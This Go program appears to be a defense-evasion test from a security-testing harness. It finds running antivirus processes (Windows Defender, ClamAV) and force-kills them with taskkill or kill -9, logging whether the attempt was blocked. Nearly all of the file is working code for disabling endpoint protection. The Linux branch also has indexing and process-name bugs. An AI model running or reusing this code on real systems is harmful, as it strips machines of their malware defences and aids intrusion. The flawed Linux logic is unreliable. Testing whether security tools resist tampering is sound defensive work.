package main

import (
	"fmt"
	"helpers"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type AVEDRExe struct {
	name string
	exe  string
}

var WinAVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}}
var LinAVEDRExecs = []AVEDRExe{AVEDRExe{"ClamAV", "clam"}}

func checkIfItIsAVEDR(name string) bool {
	if runtime.GOOS == "windows" {
		for i := 0; i < len(WinAVEDRExecs); i++ {
			if WinAVEDRExecs[i].exe == name {
				return true
			}
		}
	} else {
		for i := 0; i < len(LinAVEDRExecs); i++ {
			if LinAVEDRExecs[i].exe == name {
				return true
			}
		}
	}

	return false
}

func main() {
	/*getAVEDR := exec.Command("wmic", "/node:localhost", "/namespace:\\root\\SecurityCenter2", "path", "AntiVirusProduct", "Get", "DisplayName")
	AVEDRoutput, err := getAVEDR.Output()
	if err != nil {
		fmt.Println(err.Error())
	}
	listOfAVEDR := strings.Split(string(AVEDRoutput), "\n")
	for i := 0; i < len(listOfAVEDR); i++ {
		fmt.Println(listOfAVEDR[i])
	}*/

	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "DefenseEnvasion")
	helpers.WriteLog(nameOfLogFile, "Starting test: DefenseEnvasion", 2)

	if runtime.GOOS == "windows" {
		getProcesses := exec.Command("tasklist")
		processes, err := getProcesses.Output()
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			os.Exit(2)
		}

		processInfo := strings.Split(string(processes), "\n")
		var AVEDRprocess []string
		for i := 3; i < len(processInfo); i++ {
			processFileds := strings.Fields(processInfo[i])
			if len(processFileds) > 0 {
				name := processFileds[0]
				if checkIfItIsAVEDR(name) {
					AVEDRprocess = append(AVEDRprocess, name)
				}
			}

		}

		for i := 0; i < len(AVEDRprocess); i++ {
			stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
			_, err := stopAVEDR.Output()
			if err != nil {
				if err.Error() == "exit status 1" {
					os.Exit(1)
				} else {
					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
					os.Exit(3)
				}
			}
		}
	} else {
		var AVEDRprocess []string
		for i := 0; i < len(LinAVEDRExecs); i++ {
			getpids := exec.Command("/bin/pgrep", LinAVEDRExecs[i].name)
			pids, _ := getpids.CombinedOutput()
			pidsstr := strings.Fields(string(pids))
			for j := 0; j < len(pidsstr); j++ {
				AVEDRprocess = append(AVEDRprocess, pidsstr[i])
				fmt.Println(pidsstr[i])
			}
		}

		for i := 0; i < len(AVEDRprocess); i++ {
			stopAVEDR := exec.Command("kill", "-9", AVEDRprocess[i])
			err := stopAVEDR.Run()
			if err != nil {
				if err.Error() == "exit status 1" {
					os.Exit(1)
				} else {
					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
					os.Exit(3)
				}
			}
		}
	}

	helpers.WriteLog(nameOfLogFile, "Ending test: DefenseEnvasion", 2)
	os.Exit(0)

}
